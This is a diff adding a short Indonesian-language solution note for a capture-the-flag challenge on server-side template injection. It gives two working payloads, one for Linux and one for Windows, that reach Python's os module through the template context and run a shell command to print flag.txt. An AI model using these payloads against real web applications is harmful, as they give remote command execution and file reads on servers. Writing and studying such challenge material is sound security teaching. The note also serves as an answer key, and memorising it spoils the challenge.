@@ -1,0 +1,10 @@
+1. Peserta nantinya diharapkan mencari tahu mengenai SSTI terlebih dahulu
+2. Peserta nanti mencari cheatsheet ataupun refrensi mengenai SSTI exploitation
+3. nantinya peserta dapat menampilkan file flag.txt yang berisi flag
+
+CONTOH:
+di deploy pada linux
+request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()
+
+di deploy pada windows:
+request.application.__globals__.__builtins__.__import__('os').popen('type flag.txt').read()
